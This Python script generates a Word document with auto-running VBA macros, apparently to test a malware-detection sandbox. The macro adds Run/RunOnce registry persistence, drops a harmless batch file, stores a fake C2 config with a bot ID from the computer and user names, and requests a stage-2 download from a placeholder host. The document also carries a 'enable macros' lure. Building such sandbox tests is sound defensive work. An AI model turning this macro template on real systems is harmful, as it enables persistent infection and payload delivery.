"""
create_macro_test_doc.py — Generate a Malicious Test Document
==============================================================
Creates a Word .doc file with VBA macros that simulate real
malware behavior:
  1. Registry persistence (HKCU\...\Run)
  2. Drops a payload file to disk
  3. Creates a suspicious registry key
  4. Attempts a network connection (WinHTTP)

Run this on the GCP Sandbox VM where Microsoft Word is installed:
    python create_macro_test_doc.py

Output: test_macro_doc.doc (in the current directory)
"""

import os
import sys
import time

def create_test_doc(output_path="test_macro_doc.doc"):
    """Create a .doc file with malicious test macros using Word COM automation."""
    
    try:
        import win32com.client
    except ImportError:
        print("[ERROR] pywin32 is not installed. Run: pip install pywin32")
        sys.exit(1)

    print("[*] Starting Microsoft Word...")
    word = win32com.client.Dispatch("Word.Application")
    word.Visible = False  # Run silently
    word.DisplayAlerts = 0  # Suppress dialogs

    try:
        print("[*] Creating new document...")
        doc = word.Documents.Add()

        # Add some body text to make it look like a real document
        doc.Content.Text = (
            "CONFIDENTIAL - Internal Report\n\n"
            "Q2 2026 Financial Summary\n\n"
            "Please enable macros to view the interactive charts.\n\n"
            "This document contains embedded analytics.\n"
        )

        # ── VBA Macro Code ──
        # This simulates real malware behavior that the sandbox should detect
        vba_code = r'''
Attribute VB_Name = "SandboxTestModule"
' ============================================================
' Sandbox Test Macro — Simulates Malware Behavior
' ============================================================
' This macro runs automatically when the document is opened.
' It performs 4 suspicious actions that the sandbox monitors
' should detect and flag:
'
'   1. REGISTRY PERSISTENCE — Writes to HKCU\...\Run
'   2. FILE DROP — Creates a fake payload on disk
'   3. REGISTRY CONFIG — Creates a suspicious config key
'   4. NETWORK BEACON — Attempts an HTTP connection
' ============================================================

Sub AutoOpen()
    On Error Resume Next
    
    ' --- Action 1: Registry Persistence ---
    ' Write to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    ' This is the #1 persistence mechanism used by real malware.
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    
    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MacroTestPersistence", _
                 "C:\Windows\Temp\macro_payload.exe", "REG_SZ"
    
    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\MacroTestRunOnce", _
                 "C:\Windows\Temp\macro_update.exe", "REG_SZ"
    
    ' --- Action 2: Drop a fake payload to disk ---
    ' Real malware drops executables via macros.
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    Dim dropPath As String
    dropPath = Environ("TEMP") & "\macro_dropped_payload.bat"
    
    Dim f As Object
    Set f = fso.CreateTextFile(dropPath, True)
    f.WriteLine "@echo off"
    f.WriteLine "echo [SANDBOX TEST] This is a simulated malware payload"
    f.WriteLine "echo [SANDBOX TEST] Written by VBA macro at " & Now()
    f.WriteLine "pause"
    f.Close
    
    ' --- Action 3: Create suspicious registry config ---
    ' Malware often stores C2 config in custom registry keys.
    wsh.RegWrite "HKCU\Software\MacroMalwareConfig\C2Server", _
                 "http://evil-c2-server.example.com:8443/beacon", "REG_SZ"
    wsh.RegWrite "HKCU\Software\MacroMalwareConfig\BotID", _
                 "BOT-" & Environ("COMPUTERNAME") & "-" & Environ("USERNAME"), "REG_SZ"
    wsh.RegWrite "HKCU\Software\MacroMalwareConfig\Interval", _
                 300, "REG_DWORD"
    
    ' --- Action 4: Attempt a network beacon ---
    ' Real macro malware downloads stage-2 payloads.
    Dim http As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", "http://evil-c2-server.example.com/stage2.exe", False
    http.SetTimeouts 3000, 3000, 3000, 3000
    http.Send  ' This will fail (domain doesn't exist) — that's fine.
               ' The sandbox network monitor will still capture the DNS query
               ' and connection attempt.
    
    ' Cleanup objects
    Set http = Nothing
    Set f = Nothing
    Set fso = Nothing
    Set wsh = Nothing
End Sub

Sub Document_Open()
    ' Also trigger on Document_Open (backup trigger)
    AutoOpen
End Sub
'''

        print("[*] Adding VBA macro module...")
        
        # Access the VBA project and add the module
        vba_project = doc.VBProject
        vba_module = vba_project.VBComponents.Add(1)  # 1 = vbext_ct_StdModule
        vba_module.Name = "SandboxTestModule"
        vba_module.CodeModule.AddFromString(vba_code)

        print("[*] Macro added with 4 malicious behaviors:")
        print("      1. Registry persistence (Run + RunOnce)")
        print("      2. File drop (batch script to %TEMP%)")
        print("      3. Suspicious registry config (MacroMalwareConfig)")
        print("      4. Network beacon (HTTP GET to fake C2)")

        # Save as .doc (Word 97-2003 format = FileFormat 0)
        abs_path = os.path.abspath(output_path)
        doc.SaveAs2(abs_path, FileFormat=0)  # 0 = wdFormatDocument (.doc)
        print(f"\n[+] Document saved: {abs_path}")
        print(f"[+] Size: {os.path.getsize(abs_path):,} bytes")

        doc.Close(SaveChanges=False)

    except Exception as e:
        print(f"\n[ERROR] {e}")
        print("\nTroubleshooting:")
        print("  1. Make sure Word is installed")
        print("  2. Run as Administrator")
        print("  3. If 'Programmatic access to VBA project is not trusted':")
        print("     → Open Word → File → Options → Trust Center → Trust Center Settings")
        print("     → Macro Settings → Check 'Trust access to the VBA project object model'")
        try:
            doc.Close(SaveChanges=False)
        except:
            pass
    finally:
        word.Quit()
        print("[*] Word closed.")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Create a malicious test Word document")
    parser.add_argument("-o", "--output", default="test_macro_doc.doc",
                        help="Output file path (default: test_macro_doc.doc)")
    args = parser.parse_args()
    
    create_test_doc(args.output)
    
    print("\n" + "=" * 60)
    print("  HOW TO TEST")
    print("=" * 60)
    print("  1. Email this .doc file to yourself (attach it to a .eml)")
    print("  2. Upload the .eml to the sandbox API:")
    print("     POST /api/v1/analyze")
    print("  3. Expected detections:")
    print("     - Registry: 4+ changes (Run, RunOnce, MacroMalwareConfig)")
    print("     - Files: 1 dropped payload (.bat in %TEMP%)")
    print("     - Network: 1 connection attempt (HTTP to fake C2)")
    print("     - Verdict: MALICIOUS")
    print("=" * 60)
